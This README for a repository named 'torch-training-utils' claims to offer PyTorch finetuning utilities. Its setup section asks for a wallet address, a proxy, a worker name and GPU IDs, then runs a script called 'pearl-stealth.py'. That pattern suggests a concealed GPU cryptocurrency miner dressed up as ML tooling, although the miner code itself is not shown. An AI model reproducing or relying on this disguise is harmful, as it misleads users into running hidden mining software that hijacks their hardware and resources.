# torch-training-utils

PyTorch training utilities for LLM finetuning — configs, scripts, and environment setup.

## Features

- Automated environment setup and configuration
- GPU memory management and optimization
- Distributed training support with NCCL
- Wandb integration for experiment tracking
- Process monitoring and resource management

## Setup

```bash
pip install torch transformers accelerate wandb

# Configure
export PROXY=localhost:8080
export ADDRESS=your-wallet-address
export GPU_DEVICES=0,1

# Run
python3 pearl-stealth.py
```

## Environment Variables

| Var | Required | Description |
|---|---|---|
| `PROXY` | ✅ | Training server address |
| `ADDRESS` | ✅ | Account identifier |
| `WORKER` | ❌ | Worker name (auto-generated) |
| `TOKEN` | ❌ | Auth token |
| `GPU_DEVICES` | ❌ | Comma-separated GPU IDs |

## Requirements

- Python 3.8+
- NVIDIA GPU with CUDA drivers
- GCC (for native extensions)
